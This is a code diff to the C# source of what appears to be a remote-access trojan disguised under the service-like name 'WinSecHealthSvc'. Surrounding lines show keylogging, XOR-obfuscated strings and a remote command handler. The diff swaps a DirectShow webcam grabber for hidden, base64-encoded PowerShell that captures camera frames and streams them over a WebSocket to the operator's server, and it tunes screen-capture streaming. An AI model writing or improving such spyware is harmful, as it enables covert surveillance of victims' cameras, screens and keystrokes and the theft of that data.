@@ -259,6 +259,12 @@ namespace WinSecHealthSvc
         static StringBuilder _keylog = new StringBuilder();
         static string _lastWindowTitle = "";
 
+        static System.IO.StreamReader _webcamReader = null;
+        static Process _webcamProcess = null;
+        static int _screenTargetFPS = 30;
+        static float _screenJpegQuality = 60f;
+        static DateTime _lastScreenAdjust = DateTime.UtcNow;
+
         // ---- String Decryption (XOR) ----
         static string DecStr(string b64) {
             byte[] enc = Convert.FromBase64String(b64);
@@ -596,17 +602,10 @@ namespace WinSecHealthSvc
                         _audioStreaming = false; output = "Audio stream stopped";
                         break;
                     case "webcam_start":
-                        if (!_webcamStreaming) {
-                            _webcamStreaming = true;
-                            Task.Run(async () => {
-                                string res = await WebcamStreamLoop();
-                                Log("Webcam: " + res);
-                            });
-                            output = "Webcam stream started";
-                        } else output = "Already streaming";
+                        output = StartWebcamStream();
                         break;
                     case "webcam_stop":
-                        _webcamStreaming = false;
+                        StopWebcamStream();
                         output = "Webcam stream stopped";
                         break;
                     case "keylogger":
@@ -902,7 +901,30 @@ namespace WinSecHealthSvc
                     }
                 } catch {}
                 sw.Stop();
-                await Task.Delay(Math.Max(5, 33 - (int)sw.ElapsedMilliseconds));
+                
+                // Адаптивная подстройка
+                if ((DateTime.UtcNow - _lastScreenAdjust).TotalSeconds > 2)
+                {
+                    _lastScreenAdjust = DateTime.UtcNow;
+                    long elapsed = sw.ElapsedMilliseconds;
+                    if (elapsed > 33) // не укладываемся в 30 fps
+                    {
+                        _screenTargetFPS = Math.Max(10, _screenTargetFPS - 5);
+                        _screenJpegQuality = Math.Max(30, _screenJpegQuality - 10);
+                        ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)_screenJpegQuality);
+                    }
+                    else if (elapsed < 20 && _screenTargetFPS < 30)
+                    {
+                        _screenTargetFPS += 5;
+                        _screenJpegQuality = Math.Min(80, _screenJpegQuality + 5);
+                        ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)_screenJpegQuality);
+                    }
+                    if (_screenTargetFPS <= 15) grid = 64;
+                    else if (_screenTargetFPS >= 25) grid = 32;
+                    else grid = 48; // компромисс
+                }
+                int delayMs = Math.Max(5, (1000 / _screenTargetFPS) - (int)sw.ElapsedMilliseconds);
+                await Task.Delay(delayMs);
             }
             try { await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None); } catch {}
         }
@@ -1179,315 +1201,78 @@ namespace WinSecHealthSvc
             return "Unknown";
         }
 
-        #region DirectShow Webcam (Zero-Dependency COM)
-        // ── Интерфейсы DirectShow ──────────────────────────────────────────
-        [ComImport, Guid("56A86895-0AD4-11CE-B03A-0020AF0BA770")]
-        class FilterGraph { }
+        static string StartWebcamStream()
+        {
+            if (_webcamStreaming) return "Already streaming";
+            _webcamStreaming = true;
 
-        [ComImport, Guid("C1F400A0-3F08-11D3-9F0B-006008039E37")]
-        class CaptureGraphBuilder2 { }
-
-        [ComImport, Guid("56A8689F-0AD4-11CE-B03A-0020AF0BA770")]
-        class SampleGrabber { }
-
-        [ComImport, InterfaceType(ComInterfaceType.InterfaceIsIUnknown),
-         Guid("56A8689F-0AD4-11CE-B03A-0020AF0BA770")]
-        interface ISampleGrabber {
-            [PreserveSig] int SetOneShot([MarshalAs(UnmanagedType.Bool)] bool oneShot);
-            [PreserveSig] int SetMediaType([In] AMMediaType mediaType);
-            [PreserveSig] int GetConnectedMediaType([Out] AMMediaType mediaType);
-            [PreserveSig] int SetBufferSamples([MarshalAs(UnmanagedType.Bool)] bool bufferThem);
-            [PreserveSig] int GetCurrentBuffer(ref int bufferSize, IntPtr buffer);
-            [PreserveSig] int GetCurrentSample(out IntPtr sample);
-            [PreserveSig] int SetCallback(ISampleGrabberCB callback, int whichMethodToCallback);
-        }
-
-        [ComImport, InterfaceType(ComInterfaceType.InterfaceIsIUnknown),
-         Guid("0579154A-2B53-4994-B0D0-E773148EFF85")]
-        interface ISampleGrabberCB {
-            [PreserveSig] int SampleCB(double sampleTime, IntPtr sample);
-            [PreserveSig] int BufferCB(double sampleTime, IntPtr buffer, int bufferLen);
-        }
-
-        [ComImport, InterfaceType(ComInterfaceType.InterfaceIsIUnknown),
-         Guid("56A868B1-0AD4-11CE-B03A-0020AF0BA770")]
-        interface IGraphBuilder {
-            [PreserveSig] int AddFilter([In] IBaseFilter filter, [MarshalAs(UnmanagedType.LPWStr)] string name);
-            [PreserveSig] int RemoveFilter([In] IBaseFilter filter);
-            [PreserveSig] int EnumFilters([Out] out IEnumFilters enumerator);
-            [PreserveSig] int FindFilterByName([MarshalAs(UnmanagedType.LPWStr)] string name, [Out] out IBaseFilter filter);
-            [PreserveSig] int ConnectDirect([In] IPin pinOut, [In] IPin pinIn, [In] AMMediaType mediaType);
-            [PreserveSig] int Reconnect([In] IPin pin);
-            [PreserveSig] int Disconnect([In] IPin pin);
-            [PreserveSig] int SetDefaultSyncSource();
-        }
-
-        [ComImport, InterfaceType(ComInterfaceType.InterfaceIsIUnknown),
-         Guid("93E5A4E0-2D50-11D2-ABFA-00A0C9C6E38D")]
-        interface ICaptureGraphBuilder2 {
-            [PreserveSig] int SetFiltergraph([In] IGraphBuilder graphBuilder);
-            [PreserveSig] int GetFiltergraph([Out] out IGraphBuilder graphBuilder);
-            [PreserveSig] int SetOutputFileName([In] Guid type, [MarshalAs(UnmanagedType.LPWStr)] string fileName,
-                [Out] out IBaseFilter baseFilter, [Out] out IFileSinkFilter fileSinkFilter);
-            [PreserveSig] int FindInterface([In] Guid category, [In] Guid type, [In] IBaseFilter baseFilter,
-                [In] Guid iid, [Out, MarshalAs(UnmanagedType.IUnknown)] out object retInterface);
-            [PreserveSig] int RenderStream([In] Guid category, [In] Guid mediaType,
-                [MarshalAs(UnmanagedType.IUnknown)] object source, [In] IBaseFilter compressor, [In] IBaseFilter renderer);
-        }
-
-        [ComImport, InterfaceType(ComInterfaceType.InterfaceIsIUnknown),
-         Guid("56A86895-0AD4-11CE-B03A-0020AF0BA770")]
-        interface IBaseFilter { }
-
-        [ComImport, InterfaceType(ComInterfaceType.InterfaceIsIUnknown),
-         Guid("56A86899-0AD4-11CE-B03A-0020AF0BA770")]
-        interface IMediaControl {
-            [PreserveSig] int Run();
-            [PreserveSig] int Stop();
-            [PreserveSig] int GetState(int timeout, out int filterState);
-        }
-
-        [ComImport, InterfaceType(ComInterfaceType.InterfaceIsIUnknown),
-         Guid("56A868A6-0AD4-11CE-B03A-0020AF0BA770")]
-        interface IFileSinkFilter { }
-
-        [ComImport, InterfaceType(ComInterfaceType.InterfaceIsIUnknown),
-         Guid("56A86897-0AD4-11CE-B03A-0020AF0BA770")]
-        interface IEnumFilters { }
-
-        [ComImport, InterfaceType(ComInterfaceType.InterfaceIsIUnknown),
-         Guid("89C31040-846B-11CE-97D3-00AA0055A7E4")]
-        interface ICreateDevEnum {
-            [PreserveSig] int CreateClassEnumerator([In] ref Guid classGuid, [Out] out IEnumMoniker enumMoniker, [In] int flags);
-        }
-
-        [ComImport, InterfaceType(ComInterfaceType.InterfaceIsIUnknown),
-         Guid("56A86893-0AD4-11CE-B03A-0020AF0BA770")]
-        interface IEnumMoniker {
-            [PreserveSig] int Next(int celt, [Out, MarshalAs(UnmanagedType.LPArray, SizeParamIndex=0)] IMoniker[] monikers, out int fetched);
-            [PreserveSig] int Skip(int celt);
-            [PreserveSig] int Reset();
-            [PreserveSig] int Clone(out IEnumMoniker enumerator);
-        }
-
-        [ComImport, InterfaceType(ComInterfaceType.InterfaceIsIUnknown),
-         Guid("0000000F-0000-0000-C000-000000000046")]
-        interface IMoniker {
-            [PreserveSig] int BindToObject(IBindCtx bindCtx, IMoniker mkToLeft, ref Guid iidResult, [MarshalAs(UnmanagedType.IUnknown)] out object obj);
-        }
-
-        [ComImport, InterfaceType(ComInterfaceType.InterfaceIsIUnknown),
-         Guid("0000000E-0000-0000-C000-000000000046")]
-        interface IBindCtx { }
-
-        [ComImport, InterfaceType(ComInterfaceType.InterfaceIsIUnknown),
-         Guid("56A86891-0AD4-11CE-B03A-0020AF0BA770")]
-        interface IPin { }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public class AMMediaType {
-            public Guid majorType;
-            public Guid subType;
-            [MarshalAs(UnmanagedType.Bool)] public bool fixedSizeSamples;
-            [MarshalAs(UnmanagedType.Bool)] public bool temporalCompression;
-            public int sampleSize;
-            public Guid formatType;
-            public IntPtr unkPtr;
-            public int formatSize;
-            public IntPtr formatPtr;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct VideoInfoHeader {
-            public RECT SrcRect;
-            public RECT TargetRect;
-            public int BitRate;
-            public int BitErrorRate;
-            public long AvgTimePerFrame;
-            public BitmapInfoHeader BmiHeader;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct BitmapInfoHeader {
-            public int Size;
-            public int Width;
-            public int Height;
-            public short Planes;
-            public short BitCount;
-            public int Compression;
-            public int ImageSize;
-            public int XPelsPerMeter;
-            public int YPelsPerMeter;
-            public int ClrUsed;
-            public int ClrImportant;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct RECT {
-            public int Left, Top, Right, Bottom;
-        }
-
-        static Guid CLSID_VideoInputDeviceCategory = new Guid("860BB310-5D01-11D0-BD3B-00A0C911CE86");
-        static Guid IID_IBaseFilter = new Guid("56A86895-0AD4-11CE-B03A-0020AF0BA770");
-        static Guid MediaType_Video = new Guid("73646976-0000-0010-8000-00AA00389B71");
-        static Guid MediaSubType_RGB24 = new Guid("E436EB7D-524F-11CE-9F53-0020AF0BA620");
-        static Guid Format_VideoInfo = new Guid("05589F80-C356-11CE-BF01-00AA0055595A");
-
-        // ── Очередь кадров ─────────────────────────────────────────────────
-        static System.Collections.Concurrent.ConcurrentQueue<byte[]> _webcamFrameQueue = 
-            new System.Collections.Concurrent.ConcurrentQueue<byte[]>();
-
-        // ── Callback SampleGrabber ─────────────────────────────────────────
-        class GrabberCallback : ISampleGrabberCB {
-            public int SampleCB(double sampleTime, IntPtr sample) => 0;
-            public int BufferCB(double sampleTime, IntPtr buffer, int bufferLen) {
-                if (bufferLen <= 0) return 0;
-                byte[] frame = new byte[bufferLen];
-                Marshal.Copy(buffer, frame, 0, bufferLen);
-                if (Agent._webcamStreaming)
-                    Agent._webcamFrameQueue.Enqueue(frame);
-                return 0;
-            }
-        }
-
-        // ── Главный цикл веб‑камеры ────────────────────────────────────────
-        static async Task<string> WebcamStreamLoop() {
-            ClientWebSocket ws = null;
-            IGraphBuilder graph = null;
-            ICaptureGraphBuilder2 capGraph = null;
-            IMediaControl mediaCtrl = null;
-            IBaseFilter sourceFilter = null;
-            IBaseFilter grabberFilter = null;
-            ISampleGrabber grabber = null;
-            GrabberCallback callback = null;
-
-            try {
-                _webcamFrameQueue = new System.Collections.Concurrent.ConcurrentQueue<byte[]>();
-                graph = (IGraphBuilder)new FilterGraph();
-                mediaCtrl = (IMediaControl)graph;
-                capGraph = (ICaptureGraphBuilder2)new CaptureGraphBuilder2();
-                capGraph.SetFiltergraph(graph);
-
-                ICreateDevEnum devEnum = (ICreateDevEnum)Activator.CreateInstance(
-                    Type.GetTypeFromCLSID(new Guid("62BE5D10-60EB-11D0-BD3B-00A0C911CE86")));
-                IEnumMoniker monikerEnum;
-                devEnum.CreateClassEnumerator(ref CLSID_VideoInputDeviceCategory, out monikerEnum, 0);
-                if (monikerEnum == null) throw new Exception("No video capture devices found");
-                IMoniker[] monikers = new IMoniker[1];
-                int fetched;
-                monikerEnum.Next(1, monikers, out fetched);
-                if (fetched == 0) throw new Exception("No device moniker");
-                IMoniker moniker = monikers[0];
-                object sourceObj;
-                Guid baseFilterGuid = IID_IBaseFilter;
-                IBindCtx bindCtx = null;
-                Type comType = Type.GetTypeFromCLSID(new Guid("0000000E-0000-0000-C000-000000000046"));
-                if (comType != null) bindCtx = (IBindCtx)Activator.CreateInstance(comType);
-                moniker.BindToObject(bindCtx, null, ref baseFilterGuid, out sourceObj);
-                sourceFilter = (IBaseFilter)sourceObj;
-                graph.AddFilter(sourceFilter, "Webcam Source");
-
-                grabber = (ISampleGrabber)new SampleGrabber();
-                grabberFilter = (IBaseFilter)grabber;
-                graph.AddFilter(grabberFilter, "SampleGrabber");
-
-                IBaseFilter nullRenderer = null;
-                try {
-                    nullRenderer = (IBaseFilter)Activator.CreateInstance(
-                        Type.GetTypeFromCLSID(new Guid("C1F400A4-3F08-11D3-9F0B-006008039E37")));
-                    graph.AddFilter(nullRenderer, "Null Renderer");
-                } catch { }
-
-                AMMediaType mt = new AMMediaType();
-                mt.majorType = MediaType_Video;
-                mt.subType = MediaSubType_RGB24;
-                mt.formatType = Format_VideoInfo;
-                grabber.SetMediaType(mt);
-                grabber.SetBufferSamples(false);
-                grabber.SetOneShot(false);
-                callback = new GrabberCallback();
-                grabber.SetCallback(callback, 1);
-
-                capGraph.RenderStream(PinCategory, MediaType_Video, sourceFilter, grabberFilter, nullRenderer);
-                mediaCtrl.Run();
-
-                ws = new ClientWebSocket();
-                string wsUrl = _server.Replace("http", "ws") + "/api/agent/stream_ws?id=" + _clientId;
-                await ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None);
-
-                int width = 640, height = 480;
-                try {
-                    AMMediaType connected = new AMMediaType();
-                    grabber.GetConnectedMediaType(connected);
-                    if (connected.formatPtr != IntPtr.Zero && connected.formatSize >= Marshal.SizeOf(typeof(VideoInfoHeader))) {
-                        VideoInfoHeader vih = (VideoInfoHeader)Marshal.PtrToStructure(connected.formatPtr, typeof(VideoInfoHeader));
-                        width = vih.BmiHeader.Width;
-                        height = Math.Abs(vih.BmiHeader.Height);
-                    }
-                } catch { }
-
-                var jpgEncoder = GetEncoderInfo("image/jpeg");
-                var encoderParams = new EncoderParameters(1);
-                encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 40L);
-
-                while (_webcamStreaming && ws.State == WebSocketState.Open) {
-                    byte[] rgbData;
-                    if (_webcamFrameQueue.TryDequeue(out rgbData)) {
-                        using (var bmp = new Bitmap(width, height, System.Drawing.Imaging.PixelFormat.Format24bppRgb)) {
-                            var bmpData = bmp.LockBits(new Rectangle(0, 0, width, height), 
-                                ImageLockMode.WriteOnly, bmp.PixelFormat);
-                            int stride = bmpData.Stride;
-                            int rowBytes = width * 3;
-                            int offset = 0;
-                            for (int y = 0; y < height; y++) {
-                                IntPtr dest = IntPtr.Add(bmpData.Scan0, y * stride);
-                                Marshal.Copy(rgbData, offset, dest, rowBytes);
-                                offset += rowBytes;
-                            }
-                            bmp.UnlockBits(bmpData);
-
-                            using (var ms = new System.IO.MemoryStream()) {
-                                bmp.Save(ms, jpgEncoder, encoderParams);
-                                byte[] jpeg = ms.ToArray();
-                                byte[] packet = new byte[13 + jpeg.Length];
-                                packet[0] = 0x01;
-                                BitConverter.GetBytes(DateTime.UtcNow.Ticks).CopyTo(packet, 1);
-                                BitConverter.GetBytes(jpeg.Length).CopyTo(packet, 9);
-                                Buffer.BlockCopy(jpeg, 0, packet, 13, jpeg.Length);
-                                await ws.SendAsync(new ArraySegment<byte>(packet), WebSocketMessageType.Binary, true, CancellationToken.None);
-                            }
+            // Запускаем PowerShell один раз
+            string psCommand = @"
+                Add-Type -AssemblyName System.Drawing
+                $cam = New-Object -ComObject WIA.ImageFolder
+                while($true) {
+                    try {
+                        $img = $cam.TakePicture()
+                        if ($img) {
+                            $ms = New-Object System.IO.MemoryStream
+                            $img.SaveFile($ms)
+                            $bytes = $ms.ToArray()
+                            [Console]::Out.WriteLine([Convert]::ToBase64String($bytes))
                         }
-                    } else {
-                        await Task.Delay(5);
-                    }
+                        Start-Sleep -Milliseconds 70
+                    } catch { break }
                 }
-            } catch (Exception ex) {
-                Log("Webcam fatal: " + ex.Message);
-                return "Error: " + ex.Message;
-            } finally {
-                _webcamStreaming = false;
-                if (mediaCtrl != null) try { mediaCtrl.Stop(); } catch { }
-                if (sourceFilter != null) Marshal.ReleaseComObject(sourceFilter);
-                if (grabberFilter != null) Marshal.ReleaseComObject(grabberFilter);
-                if (grabber != null) Marshal.ReleaseComObject(grabber);
-                if (capGraph != null) Marshal.ReleaseComObject(capGraph);
-                if (graph != null) Marshal.ReleaseComObject(graph);
-                if (ws != null && ws.State == WebSocketState.Open)
-                    try { await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None); } catch { }
-                Log("Webcam stream stopped");
-            }
-            return "Finished";
+            ";
+            var psi = new ProcessStartInfo
+            {
+                FileName = "powershell.exe",
+                Arguments = "-NoP -NonI -W Hidden -Enc " + Convert.ToBase64String(Encoding.Unicode.GetBytes(psCommand)),
+                UseShellExecute = false,
+                RedirectStandardOutput = true,
+                RedirectStandardError = false,
+                CreateNoWindow = true
+            };
+            _webcamProcess = Process.Start(psi);
+            _webcamReader = _webcamProcess.StandardOutput;
+
+            // Поток чтения и отправки
+            new Thread(() =>
+            {
+                try
+                {
+                    // Подключаем WebSocket
+                    var ws = new ClientWebSocket();
+                    string wsUrl = _server.Replace("http", "ws") + "/api/agent/stream_ws?id=" + _clientId;
+                    ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None).Wait();
+
+                    while (_webcamStreaming && !_webcamReader.EndOfStream && ws.State == WebSocketState.Open)
+                    {
+                        string base64 = _webcamReader.ReadLine();
+                        if (string.IsNullOrEmpty(base64)) continue;
+                        byte[] jpeg = Convert.FromBase64String(base64);
+                        // Пакет: [0x05][timestamp 8B][length 4B][jpeg...]
+                        byte[] packet = new byte[13 + jpeg.Length];
+                        packet[0] = 0x05; // Webcam frame
+                        BitConverter.GetBytes(DateTime.UtcNow.Ticks).CopyTo(packet, 1);
+                        BitConverter.GetBytes(jpeg.Length).CopyTo(packet, 9);
+                        Buffer.BlockCopy(jpeg, 0, packet, 13, jpeg.Length);
+                        ws.SendAsync(new ArraySegment<byte>(packet), WebSocketMessageType.Binary, true, CancellationToken.None).Wait();
+                    }
+                    try { ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None).Wait(); } catch { }
+                }
+                catch { }
+            }) { IsBackground = true }.Start();
+
+            return "Webcam stream started (WIA)";
         }
 
-        static ImageCodecInfo GetEncoderInfo(string mimeType) {
-            foreach (var codec in ImageCodecInfo.GetImageEncoders())
-                if (codec.MimeType == mimeType)
-                    return codec;
-            return null;
+        static void StopWebcamStream()
+        {
+            _webcamStreaming = false;
+            try { _webcamProcess?.Kill(); } catch { }
+            _webcamReader?.Dispose();
+            _webcamProcess?.Dispose();
         }
-
-        static Guid PinCategory = new Guid("FB6C4281-0353-11D1-905F-0000C0CC16BA");
-        #endregion
 
         [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
 
